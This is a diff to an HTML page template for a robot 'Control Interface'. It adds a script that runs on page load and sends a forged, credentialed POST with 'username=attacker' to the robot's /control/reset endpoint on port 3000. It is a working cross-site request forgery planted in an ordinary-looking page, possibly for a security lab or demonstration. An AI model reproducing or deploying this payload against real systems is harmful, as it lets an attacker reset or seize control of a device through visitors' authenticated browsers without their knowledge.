@@ -5,6 +5,17 @@
 <!-- Latest compiled JavaScript -->
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
 
+<script type="text/javascript">
+	var request = new XMLHttpRequest();
+	var params = "username=attacker";
+	request.open('POST', "http://<%= robot_ip %>:3000/control/reset", true);
+	request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	request.setRequestHeader("Content-length", params.length);
+	request.withCredentials = true;
+	request.setRequestHeader("Connection", "close");
+	request.send(params);
+</script>
+
 <div class="container">
 	<h1>The Control Interface (Ugly Version)</h1>
 	<div>
